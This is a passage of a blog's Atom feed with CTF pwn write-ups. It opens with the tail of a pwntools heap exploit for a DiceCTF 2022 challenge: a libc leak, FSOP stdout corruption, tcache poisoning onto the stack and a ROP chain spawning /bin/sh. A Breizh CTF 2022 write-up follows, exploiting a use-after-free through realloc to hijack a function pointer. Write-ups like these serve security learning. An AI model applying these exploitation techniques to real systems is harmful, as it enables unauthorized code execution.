<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span> <span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span> 
<span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stdout</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span><span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># large</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/diceCTF" term="diceCTF" label="diceCTF" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/aaSSfxxx" term="aaSSfxxx" label="aaSSfxxx" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/FSOP" term="FSOP" label="FSOP" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[Breizh CTF 2022 - pwn] Faible Ty Reseau]]></title>
            <link href="https://nasm.re/posts/ftm/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/ftm/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-03-04T00:00:00+00:00</published>
            <updated>2022-03-04T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Faible Ty Réseau is a basic heap-like challenge, it allows us to create a configuration, edit it, call a function pointer on it and finally to free it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">aVousN</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">a1ModifierLesPa</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">argv</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">;</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_21F3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;wtf ?&#34;</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">create</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">delete</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">exec</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
        <span class="n">show</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>They are many ways to pwn the challenge, I did it by taking advantage of the UAF in <code>create</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">create</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18uLL</span><span class="p">);</span>
    <span class="n">byte_4104</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mh">0x19uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;New hostname : &#34;</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x18uLL</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mh">0x19uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">New host : &#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mh">0x18uLL</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">byte_4104</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">realloc</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">v1</span> <span class="o">+</span> <span class="n">v2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_1259</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">byte_4104</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_1259</span><span class="p">;</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">alloc_admin</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>As we can see, if ptr is not <code>NULL</code> and that we enter only one byte for each read (by sending only \n for example), then we will trigger a <code>realloc(ptr, 1 + 1 - 2)</code> which frees <code>ptr</code>, <code>ptr</code> being freed the freelist is pointing on <code>ptr</code>. Now let&rsquo;s take a look at the <code>alloc_admin</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">alloc_admin</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">qword_40F8</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18uLL</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xAuLL</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="s">&#34;Admin&#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xAuLL</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="s">&#34;000000000&#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="o">*</span><span class="n">qword_40F8</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">qword_40F8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">qword_40F8</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">win</span><span class="p">;</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>By allocating <code>0x18</code> bytes, it gets the previous freed <code>ptr</code> and writes over a few fields like the function pointer. Then we just have to call the <code>exec</code> function which will call the win function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">exec</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))();</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Pas de configuration !&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Which gives us:</p>
<pre tabindex="0"><code>nasm@off:~/ctf/bzhCTF/pwn$ ./FTM
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
&gt;&gt;&gt;&gt; 1
New hostname : dumb

New host : dumb
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
&gt;&gt;&gt;&gt; 1
New hostname : 

New host : 
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
&gt;&gt;&gt;&gt; 3
BZHCTF{9024b719d4449bc9827478e50f0279427ccb542cc3ecdec21fce38c52b29561c}
</code></pre>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/Breizh-CTF" term="Breizh-CTF" label="Breizh CTF" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                            
                        
                    
                
            
        </entry>
    
</feed>
